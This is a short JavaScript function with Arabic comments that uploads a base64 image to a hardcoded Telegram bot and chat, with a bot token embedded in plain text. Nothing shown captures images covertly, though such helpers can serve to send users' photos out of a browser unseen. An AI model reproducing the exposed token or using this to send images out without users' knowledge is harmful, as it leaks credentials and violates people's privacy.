// إرسال الصورة إلى بوت تيليجرام
function sendToBot(imageData, photoName) {
    let botToken = "7624081263:AAEJBknssL9zfxaZmFf2uf5Xw3usF8U1lGc"; // توكن البوت
    let chatId = "7554235698"; // معرف الشات (المستخدم / القناة / المجموعة)

    // تحويل Base64 إلى Blob
    fetch(imageData)
        .then(res => res.blob())
        .then(blob => {
            let formData = new FormData();
            formData.append("chat_id", chatId);
            formData.append("photo", blob, `${photoName}.png`);
            formData.append("caption", `📸 صورة جديدة: ${photoName}`);

            return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: "POST",
                body: formData
            });
        })
        .then(response => response.json())
        .then(data => {
            console.log("تم الإرسال بنجاح:", data);
        })
        .catch(error => {
            console.error("خطأ في الإرسال:", error);
        });
}